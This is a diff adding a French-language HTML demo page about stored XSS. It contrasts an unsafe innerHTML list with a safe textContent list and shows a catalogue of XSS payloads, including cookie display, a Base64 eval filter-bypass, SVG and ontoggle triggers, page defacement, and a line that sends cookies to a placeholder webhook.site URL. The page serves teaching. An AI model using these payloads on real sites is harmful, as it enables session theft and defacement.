@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Démo — Marche partout (même Live Server)</title>
+  <style>
+    body { margin:0; font-family:system-ui,sans-serif; background:#0f172a; color:#e2e8f0; padding:30px; line-height:1.6; }
+    h1 { text-align:center; color:#60a5fa; font-size:3rem; margin-bottom:10px; }
+    .info { text-align:center; font-size:1.4rem; margin-bottom:30px; }
+    .payload {
+      background:#7f1d1d; color:#fca5a5; padding:30px; border-radius:20px; font-family:monospace;
+      font-size:1.5rem; margin:40px auto; max-width:1100px; text-align:center; border:5px dashed #ef4444;
+      box-shadow:0 0 40px rgba(239,68,68,0.5);
+    }
+    .container { display:flex; gap:50px; justify-content:center; flex-wrap:wrap; margin-top:50px; }
+    .app { background:#1e293b; padding:40px; width:500px; border-radius:25px; box-shadow:0 25px 60px rgba(0,0,0,0.8); border:6px solid; }
+    .vulnerable { border-color:#ef4444; }
+    .secure     { border-color:#10b981; }
+    h2 { text-align:center; font-size:2.3rem; margin:0 0 30px 0; }
+    input, button { width:100%; padding:18px; margin:15px 0; font-size:1.3rem; border:none; border-radius:15px; }
+    input { background:#334155; color:white; }
+    button { background:#6366f1; color:white; font-weight:bold; cursor:pointer; transition:0.3s; }
+    button:hover { background:#4f46e5; transform:scale(1.05); }
+    ul { min-height:220px; padding:0; }
+    li { background:#334155; padding:18px; margin:12px 0; border-radius:12px; list-style:none; word-break:break-all; font-family:monospace; }
+    .status { padding:22px; text-align:center; font-weight:bold; font-size:1.4rem; border-radius:15px; margin-top:25px; }
+    .danger { background:#7f1d1d; color:#fca5a5; }
+    .safe   { background:#166534; color:#86efac; }
+    a{
+        text-align: center;
+        text-decoration: none;
+        font-size: 2rem;
+        font-weight: 600;
+        position: fixed;
+    }
+  </style>
+</head>
+<body>
+<a href="./index.html">RETOUR</a>
+  <h1>XSS Démo 2025</h1>
+  <p class="info">Marche même avec Live Server, VS Code, file://, etc.</p>
+
+  <div class="payload">
+    &lt;img src=x onerror="alert('XSS exécuté')"&gt;
+  </div>
+
+  <div class="container">
+
+    <!-- VULNERABLE -->
+    <div class="app vulnerable">
+      <h2>VULNÉRABLE</h2>
+      <input type="text" id="vuln" placeholder="Colle la charge ici">
+      <button onclick="addVuln()">Ajouter (innerHTML)</button>
+      <ul id="list-vuln"></ul>
+      <div class="status danger">Une alerte va apparaître</div>
+    </div>
+
+    <!-- SECURISE -->
+    <div class="app secure">
+      <h2>SÉCURISÉ</h2>
+      <input type="text" id="safe" placeholder="Colle la charge ici">
+      <button onclick="addSafe()">Ajouter (textContent)</button>
+      <ul id="list-safe"></ul>
+      <div class="status safe">Rien ne se passe</div>
+    </div>
+
+  </div>
+
+<!-- 1 -->
+<div class="payload">
+  &lt;img src=x onerror=alert('XSS #1 - Classic')&gt;
+</div>
+<p><strong>Charge classique</strong> – La plus connue et la plus utilisée en formation. Fonctionne partout, même sur les sites mal protégés.</p>
+
+<!-- 2 -->
+<div class="payload">
+  &lt;img src=x onerror=alert(document.cookie)&gt;
+</div>
+<p><strong>Vol de cookies brut</strong> – Affiche immédiatement tous les cookies de la session actuelle. Un attaquant les récupérerait en 1 clic.</p>
+
+<!-- 3 -->
+<div class="payload">
+  &lt;img src=x onerror=alert('Cookies volés :\n\n'+document.cookie)&gt;
+</div>
+<p><strong>Message clair pour la victime</strong> – Plus lisible et effrayant pour l’utilisateur final. Parfait en démo pédagogique.</p>
+
+<!-- 4 -->
+<div class="payload">
+  &lt;script&gt;alert('Script direct – XSS Stored !')&lt;/script&gt;
+</div>
+<p><strong>Injection directe de &lt;script&gt;</strong> – La forme la plus évidente de XSS Stored. Bloquée par les navigateurs modernes… sauf si innerHTML est utilisé.</p>
+
+<!-- 5 -->
+<div class="payload">
+  &lt;img src=x onerror=eval(atob('YWxlcnQoJ1hTUyBlbiBCYXNlNjQgISEnKQ=='))&gt;
+</div>
+<p><strong>XSS encodé en Base64</strong> – Contourne les filtres qui bloquent simplement le mot "alert". Technique très utilisée dans les attaques réelles.</p>
+
+<!-- 6 -->
+<div class="payload">
+  &lt;svg onload=alert('SVG XSS – Invisible et puissant')&gt;&lt;/svg&gt;
+</div>
+<p><strong>XSS via SVG</strong> – Totalement invisible à l’œil nu. Très difficile à détecter par un utilisateur ou un modérateur.</p>
+
+<!-- 7 -->
+<div class="payload">
+  &lt;details open ontoggle="alert('XSS au clic – Details HTML5')"&gt;
+    &lt;summary&gt;Clique ici&lt;/summary&gt;
+  &lt;/details&gt;
+</div>
+
+<p><strong>XSS déclenchée par interaction</strong> – 
+L’alerte apparaît seulement lorsque l’utilisateur interagit avec la balise 
+<code>&lt;summary&gt;</code>. Ce type de déclenchement différé rend la charge difficile 
+à détecter et très discrète.</p>
+
+<!-- 8 -->
+<div class="payload">
+  &lt;img src=x onerror="document.body.innerHTML='&lt;h1 style=color:red&gt;HACKED BY XSS&lt;/h1&gt;&lt;p&gt;Tes cookies : '+document.cookie+'&lt;/p&gt;' "&gt;
+</div>
+<p><strong>Défacement complet de page</strong> – Remplace tout le contenu par un message de piratage + vol de cookies. Effet choc garanti.</p>
+
+<!-- 9 -->
+<div class="payload">
+  &lt;img src=x onerror=fetch('https://webhook.site/XXX?cookie='+document.cookie)&gt;
+</div>
+<p><strong>Exfiltration silencieuse</strong> – Envoie les cookies à un serveur distant sans rien afficher. C’est ainsi que les vrais pirates volent les sessions.</p>
+
+<!-- 10 -->
+<div class="payload">
+  &lt;img src=x onerror="setInterval(()=&gt;document.title='HACKED – '+new Date().toLocaleTimeString(),500)"&gt;
+</div>
+<p><strong>Clignotement du titre d’onglet</strong> – Change le titre de la page toutes les 0,5 s. Très visible même si l’onglet est en arrière-plan.</p>
+
+<!-- BONUS ULTIME (à utiliser avec modération) -->
+<div class="payload">
+  &lt;img src=x onerror="const d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;color:#f00;font-size:5rem;display:flex;align-items:center;justify-content:center;z-index:999999';d.innerHTML='&lt;h1&gt;VOUS ÊTES HACKÉS&lt;br&gt;&lt;br&gt;Cookies : '+document.cookie+'&lt;/h1&gt;';document.body.appendChild(d);"&gt;
+</div>
+<p><strong>Écran noir total + message géant</strong> – Effet Hollywood. Idéal pour terminer une formation ou un audit sécurité en apothéose !</p>
+
+
+
+
+  <script>
+    // Cookie simulé pour démonstration (ne fonctionne pas en local)
+    document.cookie = "session=demo12345; role=admin";
+
+    function addVuln() {
+      const input = document.getElementById('vuln');
+      const list  = document.getElementById('list-vuln');
+      const val   = input.value.trim();
+
+      if (val !== "") {
+        list.innerHTML += "<li>" + val + "</li>";
+        input.value = "";
+      }
+    }
+
+    function addSafe() {
+      const input = document.getElementById('safe');
+      const list  = document.getElementById('list-safe');
+      const val   = input.value.trim();
+
+      if (val !== "") {
+        const li = document.createElement("li");
+        li.textContent = val; // Sécurisé
+        list.appendChild(li);
+        input.value = "";
+      }
+    }
+  </script>
+
+  
+
+</body>
+</html>
